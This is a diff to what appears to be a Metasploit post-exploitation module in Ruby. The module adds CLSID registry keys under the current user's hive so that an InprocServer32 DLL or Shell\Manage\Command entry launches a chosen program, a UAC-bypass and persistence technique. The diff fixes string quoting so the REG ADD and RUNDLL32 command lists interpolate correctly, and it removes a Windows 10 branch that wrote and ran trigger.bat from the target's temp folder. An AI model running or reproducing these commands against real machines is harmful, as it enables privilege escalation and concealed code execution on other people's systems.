@@ -209,7 +209,7 @@ def run
   hacks = []
   app_path = datastore['APPL_PATH']   # %windir%\\System32\\calc.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
-  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
+  hive_key = "HKEY_CURRENT_USER\\Software\\Classes\\CLSID" # uac hive key (CLSID)
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -285,12 +285,12 @@ def run
           dll_exe = "rundll32 #{app_path},main"
           Rex::sleep(1.0)
           hacks = [
-            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f',
-            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
-            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f',
-            'REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f',
-            'REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f',
-            'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f",
+            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f",
+            "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f",
+            "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f",
+            "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f",
+            "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
           ]
         else
           #
@@ -299,29 +299,12 @@ def run
           print_status("Demonstration mode sellected")
           Rex::sleep(1.0)
             hacks = [
-              'REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f',
-              'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+              "REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f",
+              "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
             ]
         end
 
 
-       #
-       # my windows10 does not allow me to manipulate regedit
-       # so i have decided to write a bat and remote execute it
-       #
-       if sysinfo['OS'] =~ /Windows 10/
-         print_warning("system: #{sysnfo['Computer']}")
-         print_line("-------------------------------------------------------")
-         print_line("Because of remote registry manipulation restrictions!")
-         print_line("This module write/exec trigger.bat in target %tmp% folder")
-         print_line("-------------------------------------------------------")
-           File.open("%tmp%\\trigger.bat", "w") do |f|
-           f.write("REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f")
-           f.close
-           end
-         cmd_exec("%tmp%\\trigger.bat")
-         Rex::sleep(2.0)
-       else
          #
          # LOOP funtion (not windows10)
          #
@@ -343,7 +326,6 @@ def run
               print_error(" Error Running Command: #{e.class} #{e}")
             end
          end
-       end
 
 
        #
